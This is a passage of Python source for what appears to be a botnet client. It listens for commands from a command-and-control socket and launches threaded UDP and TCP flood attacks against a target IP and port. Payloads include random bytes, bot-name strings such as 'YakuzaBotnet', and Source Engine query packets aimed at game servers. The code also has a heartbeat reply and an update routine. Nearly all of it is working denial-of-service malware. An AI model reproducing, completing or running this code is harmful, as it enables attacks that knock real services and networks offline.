ezacHw4VfzRWzsglZlF","3zOWSvAY2dn9rKZZOfkJ","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","kKbPlhAwlxxnyfM3LaL0","a7pInUoLgx1CPFlGB5JF","yFnlmG7bqbW682p7Bzey","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","bOAFqQfhvMFEf9jEZ89M","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","lgKjMnqBZFEvPJKpRmMj","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF","YakuzaBotnet","d4mQasDSH6","Scarface1337","PozHlpiND4xPDPuGE6tq","tg57YSAcuvy2hdBlEWMv","VaDp3Vu5m5bKcfCU96RX","UBWcPjIZOdZ9IAOSZAy6","JezacHw4VfzRWzsglZlF","3zOWSvAY2dn9rKZZOfkJ","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","kKbPlhAwlxxnyfM3LaL0","a7pInUoLgx1CPFlGB5JF","yFnlmG7bqbW682p7Bzey","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","bOAFqQfhvMFEf9jEZ89M","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","lgKjMnqBZFEvPJKpRmMj","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF","VQz4cwRfargn00toF","lSvZgNzxYbwTfwIyxw1nSr")).encode()
                    threading.Thread(target=attack_sent1, args=(ip, port, secs,payload), daemon=True).start()
                    payload = random.choice((f"{random._urandom(random.choice([32, 64, 128]))}",f"{random.randbytes(random.choice([32, 64, 128]))}",f"{randbytes(random.choice([32, 64, 128]))}","\x55\x55\x55\x55\x00\x00\x00\x01")).encode()
                    threading.Thread(target=attack_sent1, args=(ip, port, secs,payload), daemon=True).start()
                    payload = random.choice((b'\xff\xff\xff\xffTSource Engine Query\x00',b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00',b'\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79',b"/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/","\x78\xA3\x69\x6A\x20\x44\x61\x6E\x6B\x65\x73\x74\x20\x53\x34\xB4\x42\x03\x23\x07\x82\x05\x84\xA4\xD2\x04\xE2\x14\x64\xF2\x05\x32\x14\xF4")).encode()
                    threading.Thread(target=attack_sent1, args=(ip, port, secs,payload), daemon=True).start()
            elif command == '.UDP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                mode = args[5]
                threads = int(args[6])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size,mode), daemon=True).start()
            elif command == '.TUP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                mode = args[5]
                threads = int(args[6])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size,mode), daemon=True).start()
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size,mode), daemon=True).start()
            elif command == '.UDP_OPEN':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                make_connection = int(args[4])
                booter_sent = int(args[5])
                spam_threading = int(args[6])
                size = int(args[7])
                threads = int(args[8])

                for _ in range(threads):
                    for _ in range(spam_threading):
                        threading.Thread(target=UDP_CLOSE_SEND,args=(ip,port,secs,make_connection,booter_sent,size)).start()
                if len(SOCKS_SENT_DOS) < 0:
                    for DOS_LOADER in SOCKS_SENT_DOS:
                        SOCKS_SENT_DOS.remove(DOS_LOADER)
                MAKE_CONNECT_DOS = True

            elif command == 'HI?':
                c2.send('HELLO_SERVER'.encode())
            elif command == 'UPDATE_UA':
                install_update()

        except:
            break

    c2.close()

    main()

if __name__ == '__main__':
    try:
        main()
    except:
        pass